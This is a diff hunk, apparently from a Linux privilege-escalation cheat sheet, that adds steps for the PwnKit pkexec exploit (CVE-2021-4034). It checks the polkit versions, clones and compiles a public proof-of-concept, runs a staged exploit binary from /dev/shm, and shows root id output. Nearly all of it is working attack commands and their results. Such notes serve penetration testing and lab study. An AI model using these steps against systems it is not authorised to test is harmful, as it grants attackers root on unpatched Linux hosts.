@@ -713,12 +713,35 @@ gcc -o lre linux-rds-exploit.c
 
 Memory corruption in `pkexec` — affects all polkit installations. Hidden for over ten years.
 
+Check `pkexec` and the `policykit-1` package version before trying PwnKit:
+
+```bash
+pkexec --version
+dpkg-query -W -f='${Package} ${Version}\n' policykit-1
+```
+
+Example vulnerable-looking output:
+
+```text
+pkexec version 0.105
+policykit-1 0.105-20ubuntu0.18.04.5
+```
+
 ```bash
 git clone https://github.com/arthepsy/CVE-2021-4034.git
 cd CVE-2021-4034
 gcc cve-2021-4034-poc.c -o poc
 ./poc
 # uid=0(root) gid=0(root)
+```
+
+If the exploit binary is already staged on the target, run it from a writable directory:
+
+```bash
+cd /dev/shm
+./PwnKit
+id
+# uid=0(root) gid=0(root) groups=0(root),33(www-data)
 ```
 
 ---
